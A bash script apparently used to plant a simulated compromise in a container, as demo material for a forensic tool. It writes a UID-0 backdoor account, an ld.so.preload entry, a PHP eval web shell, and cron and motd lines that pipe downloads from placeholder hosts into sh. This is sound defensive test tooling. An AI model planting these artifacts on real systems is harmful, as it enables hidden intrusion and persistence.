#!/bin/bash
# Builds the synthetic "web01" demo host used for the README screenshots.
#
# RUN ONLY INSIDE A THROWAWAY CONTAINER. It plants persistence and tampering on
# purpose (UID-0 account, ld.so.preload, malicious cron, fake service, trojaned
# binary, PAM module, web shell). Everything is inert: payloads are copies of
# sleep/true/libz, and network "C2" is a plain TCP connect.
#
#   docker run -d --name procsnap-demo --hostname web01 python:3.12-slim sleep infinity
#   docker cp . procsnap-demo:/opt/procsnap
#   docker exec procsnap-demo bash /opt/procsnap/docs/demo/plant_demo_host.sh
#   docker exec procsnap-demo bash /opt/procsnap/tests/live_attack_sim.sh /tmp/demo-case
set -eu
[ -f /.dockerenv ] || { echo "refusing: not inside a container"; exit 2; }
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq && apt-get install -y -qq netcat-openbsd sudo cron openssh-server >/dev/null
LIBZ=$(ldconfig -p | awk '/libz\.so\.1 /{print $NF; exit}')
LIBDIR=$(dirname "$LIBZ")

# accounts
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash toor            # second UID-0 account
usermod -s /bin/bash www-data
mkdir -p /var/www/.ssh /root/.ssh
ssh-keygen -q -t ed25519 -N '' -C attacker@vps -f /tmp/k && cp /tmp/k.pub /var/www/.ssh/authorized_keys

# persistence
echo '*/5 * * * * root curl -fsSL http://203.0.113.50/x.sh | sh' > /etc/cron.d/apt-sync
mkdir -p /tmp/.ICE-unix/.s && cp /bin/sleep /tmp/.ICE-unix/.s/kd
echo '@reboot /tmp/.ICE-unix/.s/kd' | crontab -u www-data -
cp /bin/sleep /dev/shm/dbus-org
mkdir -p /etc/systemd/system
printf '[Unit]\nDescription=D-Bus helper\n[Service]\nExecStart=/dev/shm/dbus-org --daemon\nRestart=always\n[Install]\nWantedBy=multi-user.target\n' \
  > /etc/systemd/system/dbus-org.service
cp "$LIBZ" "$LIBDIR/libsystemd-core-x.so" && echo "$LIBDIR/libsystemd-core-x.so" > /etc/ld.so.preload
cp "$LIBZ" "$LIBDIR/security/pam_sshlog.so" 2>/dev/null || { mkdir -p "$LIBDIR/security"; cp "$LIBZ" "$LIBDIR/security/pam_sshlog.so"; }
printf '#!/bin/sh\n# collects sudo passwords\nexec /usr/bin/sudo "$@"\n' > /usr/local/bin/sudo && chmod +x /usr/local/bin/sudo
mkdir -p /etc/update-motd.d && printf '#!/bin/sh\n(wget -qO- http://203.0.113.9/m | sh) &\n' > /etc/update-motd.d/99-stats && chmod +x /etc/update-motd.d/99-stats
mkdir -p /var/www/html/uploads && echo '<?php @eval(base64_decode($_POST["z"])); ?>' > /var/www/html/uploads/thumb.php
printf '\0' >> /usr/bin/whoami                                     # trojaned packaged binary
printf 'id\nwget http://203.0.113.9/k -O /tmp/k; chmod +x /tmp/k\necho YmFzaAo= | base64 -d | sh\nhistory -c\n' > /root/.bash_history

# a long-lived outbound "C2" session from a binary in /var/tmp
cp "$(readlink -f "$(command -v python3)")" /var/tmp/.kworker   # /dev/shm is noexec in Docker
setsid /var/tmp/.kworker -c 'import socket,time
s=[socket.create_connection((h,443),timeout=5) for h in ("1.1.1.1","9.9.9.9")]
time.sleep(3600)' </dev/null >/dev/null 2>&1 &

# sshd for a "logged in now" session
mkdir -p /run/sshd && touch /run/utmp /var/log/wtmp && /usr/sbin/sshd
echo "[+] demo host planted"
